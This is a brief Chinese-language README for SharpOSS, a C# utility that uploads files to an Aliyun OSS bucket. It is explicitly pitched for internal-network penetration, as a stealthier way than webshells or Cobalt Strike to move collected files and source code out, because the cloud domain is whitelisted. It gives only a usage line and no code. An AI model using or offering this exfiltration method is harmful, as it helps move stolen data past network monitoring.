# SharpOSS


### 内网需求
“内网渗透的本质是信息收集”,尝尝会收集到一些体积较大的文件或者是源码进行分析利用。而网络情况复杂的情况下，通过菜刀一类webshell管理工具或CS一类C2工具来进行传输文件是非常慢的，而且aliyunOSS是白域名，比cs传输文件更为隐秘。所以会用到AliyunOSS来进行快速文件传输。所以就看了一下aliyun-oss-csharp-sdk实现了这个功能。

```
> SharpOSS.exe
    Author: Uknow
    Usage: SharpOSS.exe bucketName accessKeyId accessKeySecret endpoint UploadFilePath
```
